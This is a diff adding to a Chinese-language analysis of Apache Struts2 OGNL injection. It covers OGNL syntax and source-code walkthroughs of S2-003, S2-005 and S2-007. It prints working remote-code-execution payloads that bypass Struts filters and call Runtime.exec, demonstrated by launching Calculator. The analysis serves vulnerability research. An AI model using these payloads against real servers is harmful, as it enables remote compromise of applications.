@@ -9,7 +9,36 @@ Struts2的架构处理请求的流程：`Dispatcher(ActionMapper+FilterDispatche
 
 Struts2还有个数据流体系： `ActionContext和ValueStack`。其中ValueStack是ActionContext的一个组成部分。 ActionContext是数据载体，负责数据存储和共享。ValueStack则负责计算，提供了表达式引擎计算的场所。
 
-Struts2漏洞的入口是`OgnlUtil.getValue()`会对表达式进行解析，攻击者可以通过OGNL特性和语法构造恶意表达式。从不同的Interceptor或者标签入手最终触发`OgnlUtil.getValue()`。
+Struts2漏洞的入口是`OgnlUtil.getValue()`会对表达式进行解析，攻击者可以通过OGNL特性和语法构造恶意表达式。从不同的Interceptor或标签入手最终触发`OgnlUtil.getValue()`。
+
+### Struts2 OGNL语法
+Struts2和普通的OGNL有一些不同。Struts中，ValueStack是上下文中的根对象，根据栈结构对其中对象进行排列
+
+对象属性获取，如果多个对象都有blah属性，那么获取位于栈前面的对象。或者根据栈索引获取对象。  
+```
+species or #animal.species or #animal['species']  // call to animal.getSpecies()
+salary or #person.salary or #person['salary'] // call to person.getSalary()
+name       // call to animal.getName() because animal is on the top
+
+[0].name   // call to animal.getName()
+[1].name   // call to person.getName()
+```
+
+静态属性和静态方法的获取。Struts2默认不允许访问静态的，如果要访问需要将常量`struts.ognl.allowStaticMethodAccess`设为true。
+```
+@some.package.ClassName@FOO_PROPERTY  //访问静态属性
+@some.package.ClassName@someMethod()  //访问静态方法
+```
+
+括号表达式。`(one)(two)`，one计算完作为根对象对two进行计算。每个括号对应语法树上的一个分支，并从最右边的叶子节点开始解析。
+```
+(fact)(30H)  // 等价于 #fact(30H)
+
+(expression)(constant)=value  // 执行expression=value
+(constant)((expression1)(expression2)) // 先执行expression2 再执行expression1
+```
+
+其他内容可参考官方文档: https://commons.apache.org/proper/commons-ognl/language-guide.html
 
 ### Struts2历史漏洞
 
@@ -82,15 +111,171 @@ public static Object translateVariables(char open, String expression, ValueStack
 
 
 ### S2-003
+S2-003的demo写个Action就行。当访问该Action，如`index.action?(xxxx)`时，ParametersInterceptor拦截器会解析参数，将参数通过setParameters()写入到要执行的Action中。
+```java
+public String intercept(ActionInvocation invocation) throws Exception {
+    OgnlContextState.setCreatingNullObjects(contextMap, true); 
+    OgnlContextState.setDenyMethodExecution(contextMap, true); // 禁止方法执行，对应属性xwork.MethodAccessor.denyMethodExecution=true
+    OgnlContextState.setReportingConversionErrors(contextMap, true);
+    ValueStack stack = ac.getValueStack();
+    this.setParameters(action, stack, parameters); // setParameters
+}
 
+protected void setParameters(Object action, ValueStack stack, Map parameters) {
+    Iterator iterator = params.entrySet().iterator();
+    while(true) {
+        entry = (Entry)iterator.next();
+        name = entry.getKey().toString();
+        acceptableName = this.acceptableName(name) && (parameterNameAware == null || parameterNameAware.acceptableParameterName(name)); // 对name进行过滤，如果不符合直接return跳出循环
+	Object value = entry.getValue();
+	stack.setValue(name, value);  // 触发
+    }
+}
+```
+此处有两个需要注意的点，(1) ParametersInterceptor默认将`denyMethodExecution`设置为true，在`XWorkMethodAccessor`类调用静态方法前，会先取该属性值进行判断。true禁止了静态方法执行。所以想要执行命令就需要先将这个属性设置为false。
+```java
+public Object callStaticMethod(Map context, Class aClass, String string, Object[] objects) throws MethodFailedException {
+    Boolean exec = (Boolean)context.get("xwork.MethodAccessor.denyMethodExecution");
+    boolean e = exec == null ? false : exec;
+    return !e ? this.callStaticMethodWithDebugInfo(context, aClass, string, objects) : null; //return super.callStaticMethod(context, aClass, methodName, objects);
+}           
+```
+(2) 其中对name进行过滤没有考虑到编码的问题。OGNL底层支持unicode编码或八进制，也就是说虽然禁止了`#context`这样调用对象，但是可以通过`\u0023context`来绕过。所以在官方漏洞说明中提到的是*绕过ParameterInterceptor内置的对于#使用的保护*。
+```java
+protected boolean acceptableName(String name) {
+    return name.indexOf(61) == -1 && name.indexOf(44) == -1 && name.indexOf(35) == -1 && name.indexOf(58) == -1;
+} // 分别对应 `=` `,` `#` `:`
+```
 
+可以看到S2-003触发点是`OgnlValueStack.setValue()`，调用到`OgnlUtil.setValue()`时会对name进行`compile()`操作，实际上就是将name转换成对应的数据类型。
+```
+ASTSequence: "c[0],c[1]..."
+ASTMap:  var@ClassName@{key:value} or #var{key:value}
+ASTList: {c[0],c[1]}
+ASTConst: "" 
+ASTAssign: c[0]=c[1]
+ASTChain: c[0].c[1]
+ASTEval: (c[0])(c[1]) 
+ASTKeyValue: key->value
+ASTProject: {c[0]}
+ASTProperty: [c[0]]
+```
+S2-003的pyaload形如`('\u0023')(bla)(bla)&(a)(('\u0023')(bla))`，对应的就是ASTEval。那么`OgnlUtil.setValue()`调用的就是`ASTEval.setValueBody()`，代码如下。
+```java
+protected void setValueBody(OgnlContext context, Object target, Object value) throws OgnlException {
+    Object expr = this.children[0].getValue(context, target); // ASTEval.getValueBody()
+    Object previousRoot = context.getRoot();
+    target = this.children[1].getValue(context, target);
+    Node node = expr instanceof Node ? (Node)expr : (Node)Ognl.parseExpression(expr.toString());
+    context.setRoot(target);
+    node.setValue(context, target, value);
+}
+```
+它把每个括号内的内容当成一个children，获取对应的值，调用`ASTEval.getValueBody()`，该方法和上述代码极为类似，只是将`node.setValue()`变成了`node.getValue()`。如果此时解析的node是OGNL表达式，那么在`node.getValue()`时就会触发表达式执行。
 
+### S2-005
+S2-005是S2-003修复的绕过。先看S2-003的payload
+```
+('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla)(bla)&
+('\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\'open\u0020/System/Applications/Calculator.app\')')(bla)(bla)
+```
+(1)将denyMethodExecution属性值改为false，(2)调用了静态方法`@java.lang.Runtime@getRuntime()`。两步都是为了调用静态方法。所以S2-003在修复时，也是为了保护静态方法不被调用。  
 
+如果对比S2-003修复前后的`ParametersInterceptor.setParameters()`，会发现多了如下几行代码
+```java
+ValueStack newStack = this.valueStackFactory.createValueStack(stack); // this.securityMemberAccess = new SecurityMemberAccess(allowStaticMethodAccess);
+...
+boolean memberAccessStack = newStack instanceof MemberAccessValueStack;
+if (memberAccessStack) {
+    MemberAccessValueStack accessValueStack = (MemberAccessValueStack)newStack;
+    accessValueStack.setAcceptProperties(this.acceptParams); // 设置securityMemberAccess.acceptProperties，为空
+    accessValueStack.setExcludeProperties(this.excludeParams); // 设置securityMemberAccess.excludeProperties，包含两个匹配模式dojo\..*和^struts\..*
+}
+```
+首先ValueStack多了一个securityMemberAccess属性，`this.valueStackFactory.createValueStack`时初始化如下。然后在accessValueStack操作中更新了两个属性。
+```
+allowStaticMethodAccess = false
+excludeProperties = {Collections$EmptySet@24303}  size = 0   -> dojo\..*和^struts\..*
+acceptProperties = {Collections$EmptySet@24303}  size = 0
+allowPrivateAccess = false
+allowProtectedAccess = false
+allowPackageProtectedAccess = false
+```
 
+在静态方法`@java.lang.Runtime@getRuntime()`调用时调用栈如下
+```
+OgnlRuntime.callStaticMethod()
+  XWorkMethodAccessor.callStaticMethod()  -> 这步判断xwork.MethodAccessor.denyMethodExecution
+    OgnlRuntime.callAppropriateMethod() 
+      OgnlRuntime.isMethodAccessible()
+        SecurityMemberAccess.isAccessible() -> 这步判断this.allowStaticMethodAccess属性
+```
 
+`SecurityMemberAccess.isAccessible()`方法核心判断如下
+```java
+if (Modifier.isStatic(modifiers) && member instanceof Method && !this.getAllowStaticMethodAccess()) { //allowStaticMethodAccess属性默认为false，进入if中
+    allow = false;
+}
 
+if (!allow) { // 如果allow被赋值为false，就return false。
+    return false;
+} else {
+    return !super.isAccessible(context, target, member, propertyName) ? false : this.isAcceptableProperty(propertyName);
+}
+```
+如果allow被赋值为true就会进入else，走到`isAcceptableProperty()`方法
+```
+protected boolean isAcceptableProperty(String name) {
+    return this.isAccepted(name) && !this.isExcluded(name);
+}
+```
+要求`isAccepted()`返回true并且isExcluded返回false。`isExcluded()`是默认返回false的。所以只需要`isAccepted()`返回true。即`acceptProperties`属性为空
+```java
+protected boolean isAccepted(String paramName) {
+    if (!this.acceptProperties.isEmpty()) {...}
+    else { // 如果acceptProperties属性为空，返回true
+        return true;
+    }
+}
 
+protected boolean isExcluded(String paramName) {
+    if (!this.excludeProperties.isEmpty()) {
+        Iterator i$ = this.excludeProperties.iterator();
 
+        while(i$.hasNext()) {
+	    Pattern pattern = (Pattern)i$.next();
+    	    Matcher matcher = pattern.matcher(paramName);
+ 	    if (matcher.matches()) { //  dojo\..*和^struts\..*能匹配到就返回true
+	        return true;
+	    }
+        }
+    }
+
+    return false;
+}
+```
+这些防御方式都是SecurityMemberAccess中新加的。想要绕过防御，根据上述调用栈，在将denyMethodExecution设为false的基础上，(1) 设置SecurityMemberAccess的allowStaticMethodAccess属性为true，(2)设置SecurityMemberAccess的acceptProperties属性为空。所以S2-005的payload如下。
+```
+(a)(('\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET')(bla))&('\u0023_memberAccess.allowStaticMethodAccess\u003dtrue')(bla)(bla)&(a)(('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla))&(b)(('\u0023ret\u003d@java.lang.Runtime@getRuntime().exec(\'open\u0020/System/Applications/Calculator.app\')')(bla))
+```
+
+### S2-007
+漏洞demo如下，此漏洞场景是配置了验证规则，类型转换出错造成了错的字符串拼接而进行OGNL解析。验证规则可以采用xml的形式，通过文件名`<ActionClassName>-validation.xml`和要验证的Action关联
+```xml
+<validators>
+    <field name="age">
+        <field-validator type="int">
+	    <param name="min">1</param>
+	    <param name="max">100</param>
+	    <message></message>
+        </field-validator>
+    </field>
+</validators>
+```
+payload如下
+```
+' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@java.lang.Runtime@getRuntime().exec('open /System/Applications/Calculator.app')) + '
+```
 
 
 
